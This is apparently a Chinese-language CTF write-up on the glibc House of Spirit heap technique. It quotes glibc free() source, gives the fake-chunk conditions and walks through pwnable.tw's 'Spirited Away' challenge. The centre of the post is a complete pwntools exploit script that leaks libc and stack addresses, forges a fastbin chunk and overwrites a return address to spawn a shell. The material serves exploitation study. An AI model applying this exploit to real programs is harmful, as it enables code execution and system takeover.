---
title: Linux glibc heap house-of-spirit
date: 2018-04-13 10:30:14
tags: [heap,house-of-spirit]
categories: Exploit
keywords: [heap,house-of-spirit]
---




House of Spirit 利用方法针对 fastbin 中的 chunk，该方法不修改 chunk 结构中的 metadata，而是直接控制释放 chunk 时传递给 free() 函数的指针，使其指向内存中伪造的 fake chunk，free() 函数执行时会将伪造的 chunk 放入 fastbin 中。当再次申请内存时，会返回伪造的 chunk，接着可对返回的内存写数据。

### **0x01 释放 fastbin chunk**    
#### **1) 检查标志位**    
House of Spirit 利用思路是将伪造的 chunk 放入 fastbin 中，下面分析堆管理实现中释放 fastbin chunk 的过程。首先，当释放的 chunk 是由 mmap() 创建时（即 IS_MMAPPED 标志位为 1）会调用 munmap_chunk() 进行释放。而我们希望能调用 \_int_free() 函数将 fake chunk 放入 fastbin，因此在伪造 chunk 时要把 IS_MMAPPED 设置为 0。此外把 NON_MAIN_ARENA 标志位也设置为 0。    
```c
/* malloc.c in glibc2.23 */
void __libc_free (void *mem)
{
  mstate ar_ptr;
  mchunkptr p;                          /* chunk corresponding to mem */

  void (*hook) (void *, const void *)
    = atomic_forced_read (__free_hook);
  if (__builtin_expect (hook != NULL, 0))
    {
      (*hook)(mem, RETURN_ADDRESS (0));
      return;
    }

  if (mem == 0)                              /* free(0) has no effect */
    return;

  p = mem2chunk (mem);
  // 判断是否由 mmap 创建的 chunk
  if (chunk_is_mmapped (p))                /* release mmapped memory. */
    {
      /* see if the dynamic brk/mmap threshold needs adjusting */
      if (!mp_.no_dyn_threshold
          && p->size > mp_.mmap_threshold
          && p->size <= DEFAULT_MMAP_THRESHOLD_MAX)
        {
          mp_.mmap_threshold = chunksize (p);
          mp_.trim_threshold = 2 * mp_.mmap_threshold;
          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2,
                      mp_.mmap_threshold, mp_.trim_threshold);
        }
      munmap_chunk (p);   // 调用 munmap_chunk 函数释放
      return;
    }

  ar_ptr = arena_for_chunk (p);
  _int_free (ar_ptr, p, 0);   // 调用 _int_free 函数释放
}
```   

#### **2) 检查 size**    
在 _int_free() 函数中，释放 chunk 时会检查该 chunk 和下一个 chunk 的 size 字段。因此，在伪造 chunk 时应满足以下条件。    
>1） fake chunk 的 size 不能超过 fastbin 中 chunk 的最大值（32bits 系统中为 64 bytes，64 bits 系统中为 128 bytes）。    
2）fake chunk 下一个 chunk 的 size 要大于 2 * SIZE_SZ（ SIZE_SZ ，32bits 系统中为 4 bytes，64 bits 系统中为 8 bytes），小于 av->system_mem（132kb，即 0x21000 bytes）。
```c
/* malloc.c in glibc2.23 */
static void _int_free (mstate av, mchunkptr p, int have_lock) {
    mchunkptr       p;           /* chunk corresponding to mem */
    INTERNAL_SIZE_T size;        /* its size */
    mfastbinptr*    fb;          /* associated fastbin */
    ...
    p = mem2chunk(mem);
    size = chunksize(p);
    ...
    // fake chunk 的 size 不能超过 fastbin 中 chunk 的最大值
    if ((unsigned long)(size) <= (unsigned long)(get_max_fast ())
         && (chunk_at_offset(p, size) != av->top) {
      // fake chunk 下一个 chunk 的 size 要大于 2 * SIZE_SZ，小于 av->system_mem
      if (__builtin_expect (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ, 0)
          || __builtin_expect (chunksize (chunk_at_offset (p, size)) >= av->system_mem, 0)) {
          …
          errstr = "free(): invalid next size (fast)";
          goto errout;
        }
      ...
}
```
若伪造的 chunk 能满足以上几个条件，便能成功欺骗 free() 函数把 fake chunk 放入 fastbin 中，当再次申请合适大小的内存时将返回 fake chunk，进而控制目标内存。    

### **0x2 利用思路**    
下面是一个利用场景：程序中存在栈溢出漏洞，溢出长度不足以覆盖栈中返回地址等目标内存，但是能覆盖栈中一个即将被 free 的堆指针 ptr。    
![](http://ooyovxue7.bkt.clouddn.com/18-4-12/35769818.jpg)    

利用思路如下：    
1）在可控区域 1 中伪造一个 chunk，伪造的 chunk 应满足上述条件，并确保该 chunk 能覆盖目标内存区域；   
2）为了知道 fake chunk 的地址，需泄露栈地址。之后通过栈溢出等漏洞修改即将释放的堆指针 ptr，使其指向 fake chunk + 2*size_t（prev_size 和 size 字段的大小，32 bits 系统中为 4 bytes，64 bits 系统中为 8 bytes）；    
3）执行 free(ptr) 释放 ptr，fake chunk 被放入 fastbin 中；     
4）使用 malloc 申请合适大小的内存，此时将返回刚释放的 fake chunk，使得目标区域可控。    

### **0x03 实例分析**    
下面以 pwnable.tw 中的 Spirited Away 为例分析该利用方法。程序和 exp 可在 [github](https://github.com/0x4C43/Linux-Exploit/tree/master/heap_house-of-spirit)下载。   
#### **1） 漏洞**    
程序中存在以下两个漏洞：    
a）缓存区溢出    
程序中调用 sprintf 函数时存在溢出漏洞，变量 v1 为 56 bytes，当评论数量 cnt 达到 3 位数时会溢出（54+3 > 56），导致其相邻变量 nbytes 被覆盖。利用该漏洞可将 nbytes 修改为 110（“n”的 ASCII 值为 0x6e），由于 nbytes 控制着 name 和 comment 的输入长度，从而又一次产生溢出漏洞。    
b）信息泄露    
此外，还存在一个信息泄露漏洞，由于栈中变量 reason 未初始化，输出 reason 时会把栈中数据一起输出。     
```c
int survey()
{
  char v1; // [esp+10h] [ebp-E8h]   // 56 bytes
  size_t nbytes; // [esp+48h] [ebp-B0h]
  size_t v3; // [esp+4Ch] [ebp-ACh]
  char comment; // [esp+50h] [ebp-A8h]   // 80 bytes
  int age; // [esp+A0h] [ebp-58h]
  void *name; // [esp+A4h] [ebp-54h]   // 指向内存空间为 60 bytes的堆指针
  int reason; // [esp+A8h] [ebp-50h]    // 80 bytes

  nbytes = 60;    // 控制name 和 comment的输入长度
  v3 = 80;
LABEL_2:
  memset(&comment, 0, 80u);   // reason未初始化
  name = malloc(60u);
  printf("\nPlease enter your name: ");
  fflush(stdout);
  read(0, name, nbytes);
  printf("Please enter your age: ");
  fflush(stdout);
  __isoc99_scanf("%d", &age);
  printf("Why did you came to see this movie? ");
  fflush(stdout);
  read(0, &reason, v3);
  fflush(stdout);
  printf("Please enter your comment: ");
  fflush(stdout);
  read(0, &comment, nbytes);
  ++cnt;
  printf("Name: %s\n", name);
  printf("Age: %d\n", age);
  printf("Reason: %s\n", &reason);
  printf("Comment: %s\n\n", &comment);
  fflush(stdout);
  sprintf(&v1, "%d comment so far. We will review them as soon as we can", cnt);  // overflow
  puts(&v1);
…
}
```

#### 2）**利用脚本**
完整的利用脚本如下：
```python
# -*-coding:utf-8-*-
# author: 0x4C43

from pwn import *

context.log_level = 'debug'

elf = ELF('./spirited_away')
libc = ELF('./libc-2.23.so')

p = process('./spirited_away')

def comment1(name,age,reason,comment):
    p.recvuntil('name: ')
    p.send(name)
    p.recvuntil('age: ')
    p.sendline(age)
    p.recvuntil('movie? ')
    p.send(reason)
    p.recvuntil('comment: ')
    p.send(comment)

def comment2(age,reason):
    p.recvuntil('age: ')
    p.sendline(age)
    p.recvuntil('movie? ')
    p.sendline(reason)

def leaklibc():
    comment1("BBBB","20",24*"B","BBBB")
    p.recvuntil('Reason: ')
    p.recv(24)
    addr = u32(p.recv(4))
    print hex(addr)
    libc_base = addr -libc.symbols['_IO_file_sync']-7
    p.recvuntil('<y/n>: ')
    p.send('y')
    return libc_base

def leakstack():
    comment1("BBBB","20",80*"B","BBBB")
    p.recvuntil('Reason: ')
    p.recv(80)
    addr = u32(p.recv(4))
    p.recvuntil('<y/n>: ')
    p.send('y')
    return addr

def fakechunk(stack):
    fake_chunk = "DDDD"        # prev_size
    fake_chunk += p32(0x41)    # size
    fake_chunk += (0x40-8)*"D"
    fake_chunk += p32(0)  
    fake_chunk += p32(0x41)    # next chunk size

    fake_chunk_ptr = stack - 0x70 + 8
    comment  = "D" * 0x50
    comment += p32(0x00)       # fake age
    comment += p32(fake_chunk_ptr) # overwrite name ptr

    comment1("DDDD","40",fake_chunk, comment)
    p.recvuntil('<y/n>: ')
    p.send('y')

def main():
    raw_input('add 100 comment to overwrite nbytes')
    for i in range(10):
        comment1("AAAA","10","AAAA","AAAA")
        p.recvuntil('<y/n>: ')
        p.sendline('y')
    for i in range(90):
        comment2("10","AAAA")
        p.recvuntil('<y/n>: ')
        p.send('y')   

    raw_input('leak system_addr')
    libc_base = leaklibc()
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + next(libc.search('sh\0'))
    log.success("system_addr: {}".format(hex(system_addr)))
    log.success("binsh_addr: {}".format(hex(binsh_addr)))

    raw_input('leak stack address')
    stack_addr = leakstack()
    log.success("stack_addr: {}".format(hex(stack_addr)))

    raw_input('overflow return addr to exec system("/bin/sh")')   
    # add fake chunk to fastbin
    fakechunk(stack_addr)
    # alloc fake chunk to name, and overwrite return addr of survey
    name = 76*"E" + p32(system_addr) + "EEEE" + p32(binsh_addr)
    comment1(name,"50","EEEE","EEEE")
    p.recvuntil('<y/n>: ')
    p.send('n')
    p.interactive()

if __name__ == "__main__":
    main()
```

#### 3）**利用过程**     
a）首先添加 100 条评论，使得 v1 溢出修改 nbytes 为 0x6e。nbytes 被修改前内存中地址如下：    
![](http://ooyovxue7.bkt.clouddn.com/18-4-12/46175149.jpg)    
nbytes 被修改后内存中地址如下：      
![](http://ooyovxue7.bkt.clouddn.com/18-4-12/70375310.jpg)    

b）接着利用内存泄露漏洞可得到 libc 中 \_IO_file_sync 函数在内存中的地址，题目已给 libc.so 文件，通过该地址可计算处 system 函数和 “/bin/sh” 字符串的地址。    
![](http://ooyovxue7.bkt.clouddn.com/18-4-12/50239044.jpg)   
此外，利用该漏洞还能泄露栈地址，通过计算偏移量可得到堆指针 \*name 的内存地址，为后续覆盖该堆指针做准备。      
![](http://ooyovxue7.bkt.clouddn.com/18-4-12/91788711.jpg)       

c）继续添加评论时，可在 reason 内存中伪造一个 fast chunk。    
![](http://ooyovxue7.bkt.clouddn.com/18-4-12/93324098.jpg)  

d）溢出 comment 变量内存，修改堆指针 \*name 指向伪造的 chunk。堆指针被覆盖前内存如下：    
![](http://ooyovxue7.bkt.clouddn.com/18-4-12/47717698.jpg)        
堆指针被覆盖后内存如下：    
![](http://ooyovxue7.bkt.clouddn.com/18-4-12/37025857.jpg)     

e）之后添加评论前程序会 free(name)，此时伪造的 chunk 将被加入 fastbin 中。     
![](http://ooyovxue7.bkt.clouddn.com/18-4-12/18602401.jpg)   

f）再次添加评论，会把栈中伪造的 chunk 分配给 name，此时溢出 name 可覆盖 survey 函数的返回地址为 system 函数地址。返回地址被修改前内存如下：    
![](http://ooyovxue7.bkt.clouddn.com/18-4-12/27242292.jpg)     
返回地址被修改后内存如下：    
![](http://ooyovxue7.bkt.clouddn.com/18-4-12/44036325.jpg)   

g）程序返回时将执行 system。     
![](http://ooyovxue7.bkt.clouddn.com/18-4-12/83693658.jpg)   

____
References:   
[1] [MALLOC DES-MALEFICARUM](http://phrack.org/issues/66/10.html)   
[2] [House of Spirit](https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit.html)    
[3] [堆之House of Spirit](https://www.anquanke.com/post/id/85357)  
